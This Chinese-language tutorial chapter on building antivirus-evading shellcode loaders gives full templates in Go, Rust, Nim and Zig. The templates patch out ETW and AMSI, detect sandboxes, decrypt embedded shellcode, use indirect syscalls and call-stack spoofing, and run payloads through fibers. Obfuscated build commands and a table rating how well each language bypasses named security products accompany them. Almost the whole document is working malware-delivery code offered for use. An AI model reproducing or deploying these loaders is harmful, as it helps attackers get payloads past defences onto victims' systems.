# 17 - 现代Loader开发 (Go / Rust / Nim / Zig)

> 新一代语言的免杀优势：非标准PE结构 + 编译器多样性 + 难以逆向

## 一、Go语言 Loader (当前最佳选择)

### 1.1 为什么Go免杀效果好
```
Go编译的PE特点:
- 较大体积（~2-5MB），稀释恶意代码占比
- 独特的PE结构（非VC++标准模板）
- Go运行时特征（GC、goroutine调度）
- 杀软训练集以C/C++为主 → Go检测率低
- 360核晶/火绒对Go样本检测极弱
```

### 1.2 Go编译最佳实践
```bash
# 基础编译
GOOS=windows GOARCH=amd64 CGO_ENABLED=0 go build -ldflags="-s -w -H=windowsgui" -o payload.exe

# garble混淆编译（推荐）
CGO_ENABLED=0 GOOS=windows GOARCH=amd64 \
garble -tiny -literals -seed=random build \
  -ldflags="-s -w -H=windowsgui" \
  -gcflags="-N -l" \
  -o payload.exe main.go

# garble参数说明:
# -tiny: 移除调试信息+最小化二进制
# -literals: 混淆字符串字面量
# -seed=random: 每次不同的随机种子（关键！）
# -ldflags="-s -w": 去除符号表
# -H=windowsgui: 无窗口执行
# -gcflags="-N -l": 禁用优化和内联（有时反而减少特征）
```

### 1.3 Go间接Syscall Loader模板
```go
package main

import (
    "crypto/aes"
    "crypto/cipher"
    "encoding/hex"
    "syscall"
    "time"
    "unsafe"

    "golang.org/x/sys/windows"
)

var (
    ntdll          = windows.NewLazySystemDLL("ntdll.dll")
    kernel32       = windows.NewLazySystemDLL("kernel32.dll")
)

// 动态获取SSN（避免硬编码）
func getSyscallNumber(funcName string) uint16 {
    proc := ntdll.NewProc(funcName)
    // 从syscall stub中提取 SSN: mov eax, imm16
    return *(*uint16)(unsafe.Pointer(proc.Addr() + 4))
}

// Syscall Gadget搜索
func findSyscallGadget() uintptr {
    ntdllBase := ntdll.Handle()
    
    // 搜索 0F 05 C3 (syscall; ret) 或 0F 34 C3 (sysenter; ret)
    for i := uintptr(0); i < 0x200000; i++ {
        addr := ntdllBase + i
        w := *(*uint16)(unsafe.Pointer(addr))
        b := *(*byte)(unsafe.Pointer(addr + 2))
        
        if w == 0x050F && b == 0xC3 {
            return addr
        }
        if w == 0x340F && b == 0xC3 {
            return addr
        }
    }
    return 0
}

// 间接syscall wrapper (Go汇编)
// 需配合 .s 汇编文件
// TEXT ·indirectSyscall(SB), NOSPLIT, $0
//   MOVQ ssn+0(FP), AX
//   MOVQ gadget+8(FP), CX
//   POPQ R10
//   MOVQ R10, 16(SP)
//   CALL CX
//   RET

// AES-GCM 解密
func aesGCMDecrypt(encrypted []byte, key []byte) ([]byte, error) {
    block, _ := aes.NewCipher(key)
    gcm, _ := cipher.NewGCM(block)
    nonceSize := gcm.NonceSize()
    if len(encrypted) < nonceSize {
        return nil, syscall.ERROR_INVALID_DATA
    }
    nonce, ciphertext := encrypted[:nonceSize], encrypted[nonceSize:]
    return gcm.Open(nil, nonce, ciphertext, nil)
}

// 环境感知
func isSandbox() bool {
    // CPU核心
    var sysInfo windows.SystemInfo
    windows.GetSystemInfo(&sysInfo)
    if sysInfo.NumberOfProcessors < 2 { return true }
    
    // 物理内存
    var mem windows.MemoryStatusEx
    mem.Length = uint32(unsafe.Sizeof(mem))
    windows.GlobalMemoryStatusEx(&mem)
    if mem.TotalPhys < 4*1024*1024*1024 { return true }
    
    // 运行时间
    if windows.GetTickCount64() < 10*60*1000 { return true } // <10分钟
    
    return false
}

// 纤程执行（无CreateThread）
func fiberExec(shellcode []byte) {
    kernel32.NewProc("ConvertThreadToFiber").Call(0)
    
    // 分配内存 (RW)
    addr, _, _ := kernel32.NewProc("VirtualAlloc").Call(
        0, uintptr(len(shellcode)),
        0x3000, // MEM_COMMIT | MEM_RESERVE
        0x04,   // PAGE_READWRITE
    )
    
    // 写入shellcode
    var written uintptr
    kernel32.NewProc("RtlCopyMemory").Call(addr, uintptr(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
    _ = written
    
    // 改保护为RX
    var oldProtect uint32
    kernel32.NewProc("VirtualProtect").Call(addr, uintptr(len(shellcode)), 0x20, uintptr(unsafe.Pointer(&oldProtect)))
    
    // 纤程执行
    fiber, _, _ := kernel32.NewProc("CreateFiber").Call(0, addr, 0)
    kernel32.NewProc("SwitchToFiber").Call(fiber)
}

// ETW Patch
func patchETW() {
    proc := ntdll.NewProc("EtwEventWrite")
    var oldProtect uint32
    // xor eax, eax; ret
    patch := []byte{0x31, 0xC0, 0xC3}
    kernel32.NewProc("VirtualProtect").Call(
        proc.Addr(), uintptr(len(patch)), 0x40, // PAGE_EXECUTE_READWRITE
        uintptr(unsafe.Pointer(&oldProtect)),
    )
    kernel32.NewProc("RtlCopyMemory").Call(proc.Addr(), uintptr(unsafe.Pointer(&patch[0])), uintptr(len(patch)))
}

// AMSI Patch
func patchAMSI() {
    amsi := windows.NewLazySystemDLL("amsi.dll")
    proc := amsi.NewProc("AmsiScanBuffer")
    var oldProtect uint32
    // mov eax, 0x80070057; ret (AMSI_RESULT_CLEAN)
    patch := []byte{0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3}
    kernel32.NewProc("VirtualProtect").Call(
        proc.Addr(), uintptr(len(patch)), 0x40,
        uintptr(unsafe.Pointer(&oldProtect)),
    )
    kernel32.NewProc("RtlCopyMemory").Call(proc.Addr(), uintptr(unsafe.Pointer(&patch[0])), uintptr(len(patch)))
}

// Sleep混淆
func obfuscatedSleep(ms uint32) {
    // 加密敏感数据区域
    // ...
    
    // 使用可等待定时器代替Sleep
    hTimer, _ := windows.CreateWaitableTimer(nil, true, nil)
    dueTime := windows.NsecToFiletime(-int64(ms) * 10000)
    windows.SetWaitableTimer(hTimer, &dueTime, 0, nil, nil, false)
    windows.WaitForSingleObject(hTimer, windows.INFINITE)
    windows.CloseHandle(hTimer)
    
    // 解密敏感数据区域
    // ...
}

func main() {
    // 1. 沙箱检测
    if isSandbox() {
        time.Sleep(120 * time.Second)
    }
    
    // 2. 延迟执行
    obfuscatedSleep(uint32(15000 + time.Now().UnixNano()%30000))
    
    // 3. ETW + AMSI Patch
    patchETW()
    patchAMSI()
    
    // 4. 解密shellcode
    encryptedHex := "YOUR_AES_ENCRYPTED_SHELLCODE_HEX"
    encrypted, _ := hex.DecodeString(encryptedHex)
    key := []byte("16byteAESkey2026")
    shellcode, _ := aesGCMDecrypt(encrypted, key)
    
    // 5. 纤程执行
    fiberExec(shellcode)
    
    // 保持运行
    select {}
}
```

### 1.4 Go汇编（间接syscall stub）
```asm
// syscall_amd64.s
#include "textflag.h"

// func indirectSyscall(ssn uint16, gadget uintptr, args ...uintptr) uintptr
TEXT ·indirectSyscall(SB), NOSPLIT, $0-56
    // 保存参数
    MOVQ ssn+0(FP), AX     // SSN → AX
    MOVQ gadget+8(FP), CX  // gadget地址 → CX
    
    // 构造调用栈（调用者地址从栈中获取）
    POPQ R11               // 保存返回地址
    MOVQ R11, 48(SP)       // 存到栈上
    
    // syscall参数 (Windows x64调用约定)
    MOVQ a1+16(FP), R10    // 第1参数
    MOVQ a2+24(FP), RDX    // 第2参数
    MOVQ a3+32(FP), R8     // 第3参数
    MOVQ a4+40(FP), R9     // 第4参数
    
    // 设置SSN
    MOVW AX, AX
    
    // 调用gadget
    CALL CX
    
    // 保存结果
    MOVQ AX, ret+48(FP)
    RET
```

---

## 二、Rust语言 Loader

### 2.1 Rust优势
```
- 零成本抽象 + 裸指针自由
- cargo构建 → 独特PE结构
- uwd库：专为免杀设计的调用栈欺骗
- 更小的体积（相比Go）
- 更好的控制流
```

### 2.2 uwd库（Rust调用栈欺骗）
```toml
# Cargo.toml
[dependencies]
uwd = "0.1"
windows = "0.58"
```

```rust
use uwd::spoof;
use std::ffi::c_void;

fn main() {
    // 1. ETW Patch
    disable_etw();
    
    // 2. 解密shellcode
    let encrypted = include_bytes!("../payload_aes.bin");
    let key = b"16byteAESkey2026";
    let shellcode = aes_decrypt(encrypted, key);
    
    // 3. 分配内存 (RW)
    let addr = unsafe {
        windows::Win32::System::Memory::VirtualAlloc(
            None,
            shellcode.len(),
            windows::Win32::System::Memory::MEM_COMMIT | 
            windows::Win32::System::Memory::MEM_RESERVE,
            windows::Win32::System::Memory::PAGE_READWRITE,
        )
    };
    
    // 4. 写入shellcode
    unsafe { std::ptr::copy_nonoverlapping(shellcode.as_ptr(), addr as *mut u8, shellcode.len()) };
    
    // 5. 改保护为RX
    let mut old = windows::Win32::System::Memory::PAGE_PROTECTION_FLAGS(0);
    unsafe {
        windows::Win32::System::Memory::VirtualProtect(
            addr,
            shellcode.len(),
            windows::Win32::System::Memory::PAGE_EXECUTE_READ,
            &mut old,
        );
    };
    
    // 6. 调用栈欺骗执行！
    let shellcode_fn: extern "C" fn() = unsafe { std::mem::transmute(addr) };
    let _result = spoof!(shellcode_fn); // 自动栈欺骗
}

fn disable_etw() {
    let ntdll = unsafe { 
        windows::Win32::System::LibraryLoader::GetModuleHandleA("ntdll.dll").unwrap() 
    };
    let etw_addr = unsafe {
        windows::Win32::System::LibraryLoader::GetProcAddress(ntdll, "EtwEventWrite")
    };
    // xor eax, eax; ret
    let patch: [u8; 3] = [0x31, 0xC0, 0xC3];
    let mut old: u32 = 0;
    unsafe {
        windows::Win32::System::Memory::VirtualProtect(
            etw_addr as *mut c_void, 3,
            windows::Win32::System::Memory::PAGE_EXECUTE_READWRITE,
            &mut old,
        );
        std::ptr::copy_nonoverlapping(patch.as_ptr(), etw_addr as *mut u8, 3);
    }
}
```

### 2.3 Rust编译
```bash
# Release编译
cargo build --release --target x86_64-pc-windows-msvc

# 链接优化
RUSTFLAGS="-C link-arg=-Wl,--gc-sections -C link-arg=-Wl,--strip-all -C target-feature=+crt-static" \
cargo build --release --target x86_64-pc-windows-msvc

# 减小体积
cargo build --release -Z build-std=std,panic_abort \
  -Z build-std-features=panic_immediate_abort \
  --target x86_64-pc-windows-msvc
```

---

## 三、Nim语言 Loader

### 3.1 Nim优势
```
- 编译为C → 再用gcc/msvc编译 → 双层特征变换
- 独特的PE结构（C后端但非标准C）
- denim混淆器 (LLVM-based)
- 与Python相似的语法 → 快速开发
- 全功能反射/元编程
```

### 3.2 Nim Loader 模板
```nim
# loader.nim
import winim/lean
import nimcrypto
import os

# ETW Patch
proc patchETW() =
    let ntdll = loadLib("ntdll")
    let etwAddr = ntdll.symAddr("EtwEventWrite")
    
    var oldProtect: DWORD
    virtualProtect(etwAddr, 3, PAGE_EXECUTE_READWRITE, addr oldProtect)
    
    # xor eax, eax; ret
    var patch: array[3, byte] = [0x31'u8, 0xC0'u8, 0xC3'u8]
    copyMem(etwAddr, addr patch[0], 3)
    
    virtualProtect(etwAddr, 3, oldProtect, addr oldProtect)

# AES解密
proc aesDecrypt(encrypted: seq[byte], key: seq[byte]): seq[byte] =
    var ctx: AESContext
    ctx.init(key, nil, CTRMode)
    result = ctx.decrypt(encrypted)

# 纤程执行
proc fiberExec(sc: seq[byte]) =
    # RW分配
    let addr = virtualAlloc(nil, sc.len, MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE)
    copyMem(addr, addr sc[0], sc.len)
    
    # 改RX
    var old: DWORD
    virtualProtect(addr, sc.len, PAGE_EXECUTE_READ, addr old)
    
    # 纤程
    let mainFiber = convertThreadToFiber(nil)
    let execFiber = createFiber(0, cast[LPFIBER_START_ROUTINE](addr), nil)
    switchToFiber(execFiber)

# 主函数
proc main() =
    # 1. 环境检测
    var si: SYSTEM_INFO
    getSystemInfo(addr si)
    if si.dwNumberOfProcessors < 2:
        sleep(120000)
    
    # 2. ETW Patch
    patchETW()
    
    # 3. 延时
    sleep(15000 + rand(30000))
    
    # 4. 解密shellcode
    let enc = readFile("payload_aes.bin")
    let key = @[byte 0x4A, 0x6F, 0x68, 0x6E, 0x57, 0x69, 0x63, 0x6B, 0x32, 0x30, 0x32, 0x35, 0x21, 0x21, 0x21, 0x21]
    let sc = aesDecrypt(enc, key)
    
    # 5. 执行
    fiberExec(sc)

when isMainModule:
    main()
```

### 3.3 Nim编译命令
```bash
# 基础编译
nim c -d:danger -d:strip --opt:size --passL:-s loader.nim

# 去GUI
nim c -d:danger -d:strip --opt:size --app:gui loader.nim

# 配合denim混淆器（LLVM）
nim c -d:danger -d:denim --passC:-mllvm --passC:-bcf loader.nim

# 交叉编译到Windows
nim c -d:danger -d:mingw --cpu:amd64 --os:windows -d:strip loader.nim
```

---

## 四、Zig语言 Loader

### 4.1 Zig优势
```
- 编译时计算（comptime）—— 编译时就处理shellcode
- 极小的运行时 + 手动内存管理
- 独特的二进制结构（全新的LLVM后端）
- 无历史特征库覆盖
```

### 4.2 Zig编译时Shellcode嵌入
```zig
const std = @import("std");
const windows = std.os.windows;

// 编译时XOR加密
fn comptimeXOR(comptime data: []const u8, comptime key: u8) [data.len]u8 {
    var result: [data.len]u8 = undefined;
    for (data, 0..) |b, i| {
        result[i] = b ^ key;
    }
    return result;
}

// 编译时嵌入加密shellcode
const enc_shellcode = comptimeXOR(@embedFile("payload.bin"), 0x5A);

// ETW Patch
fn patchETW() void {
    const ntdll = windows.GetModuleHandleA("ntdll.dll").?;
    const etw_vec = windows.GetProcAddress(ntdll, "EtwEventWrite");
    
    var old: windows.DWORD = undefined;
    _ = windows.VirtualProtect(etw_vec, 3, windows.PAGE_EXECUTE_READWRITE, &old);
    
    const patch = [_]u8{ 0x31, 0xC0, 0xC3 }; // xor eax,eax; ret
    @memcpy(@as([*]u8, @ptrCast(etw_vec)), &patch);
    
    _ = windows.VirtualProtect(etw_vec, 3, old, &old);
}

pub fn main() u8 {
    // 1. 环境检测
    if (std.Thread.getCpuCount() < 2) {
        std.time.sleep(120 * std.time.ns_per_s);
    }
    
    // 2. ETW patch
    patchETW();
    
    // 3. 解密shellcode（运行时XOR）
    const key: u8 = 0x5A;
    var shellcode: [enc_shellcode.len]u8 = undefined;
    for (enc_shellcode, 0..) |b, i| {
        shellcode[i] = b ^ key;
    }
    
    // 4. 分配 + 写入 + 执行
    const addr = windows.VirtualAlloc(
        null, shellcode.len,
        windows.MEM_COMMIT | windows.MEM_RESERVE,
        windows.PAGE_READWRITE,
    ) orelse return 1;
    
    @memcpy(@as([*]u8, @ptrCast(addr)), &shellcode);
    
    var old: windows.DWORD = undefined;
    _ = windows.VirtualProtect(addr, shellcode.len, windows.PAGE_EXECUTE_READ, &old);
    
    const func: *const fn () callconv(.C) void = @ptrCast(addr);
    func();
    
    return 0;
}
```

### 4.3 Zig编译
```bash
# 基础
zig build-exe loader.zig -target x86_64-windows -O ReleaseSmall

# 链接优化
zig build-exe loader.zig -target x86_64-windows-gnu \
  -O ReleaseSmall -fstrip -fsingle-threaded \
  -femit-bin=payload.exe

# 无控制台窗口
zig build-exe loader.zig -target x86_64-windows \
  -O ReleaseSmall -fstrip -Wl,--subsystem,windows
```

---

## 五、语言选择速查

| 维度 | Go | Rust | Nim | Zig |
|------|-----|------|-----|-----|
| **免杀效果** | ⭐⭐⭐⭐⭐ | ⭐⭐⭐⭐ | ⭐⭐⭐⭐ | ⭐⭐⭐⭐⭐ |
| **体积** | 2-5MB | 100-500KB | 200-800KB | 50-200KB |
| **开发速度** | ⭐⭐⭐⭐⭐ | ⭐⭐⭐ | ⭐⭐⭐⭐ | ⭐⭐⭐ |
| **社区/库** | ⭐⭐⭐⭐⭐ | ⭐⭐⭐⭐ | ⭐⭐⭐ | ⭐⭐ |
| **360核晶** | ✅✅ | ✅ | ✅ | ✅✅ |
| **Defender** | ✅✅ | ✅✅ | ✅✅ | ✅✅ |
| **卡巴斯基** | ✅ | ✅ | ✅ | ✅✅ |
| **CrowdStrike** | ✅ | ✅ | ✅ | ⚠️ |
| **逆向难度** | ⭐⭐⭐⭐ | ⭐⭐⭐⭐⭐ | ⭐⭐⭐⭐ | ⭐⭐⭐⭐⭐ |

### 选择建议
```
快速开发+最佳免杀 → Go (garble)
极度隐蔽+最小体积 → Zig (comptime优势)
调用栈欺骗+内存安全 → Rust (uwd库)
Python式语法+快速原型 → Nim (denim)
对抗360核晶首选 → Go 或 Zig
过卡巴斯基首选 → Zig (PE结构最独特)
```
